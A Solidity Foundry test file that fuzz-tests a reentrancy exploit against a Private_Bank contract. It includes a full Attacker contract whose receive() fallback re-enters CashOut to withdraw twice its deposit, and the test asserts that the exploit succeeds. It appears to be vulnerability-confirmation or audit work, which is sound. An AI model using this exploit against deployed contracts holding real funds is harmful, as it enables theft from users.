
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {
    Private_Bank public _privateBank;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _privateBank = new Private_Bank(address(_log));
        _attacker = new Attacker(address(_privateBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        vm.assume(attackVal * 2 <= address(this).balance);

        vm.deal(address(_privateBank), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Private_Bank private victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = Private_Bank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        victim.Deposit{value: msg.value}();
        require(victim.balances(address(this)) == msg.value, "Deposit failed");
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        initialSnapshot = address(this).balance;

        victim.CashOut(val);

        if (victim.balances(address(this)) == 0 && address(this).balance == initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.CashOut(storedAttackVal);
        }
    }
}
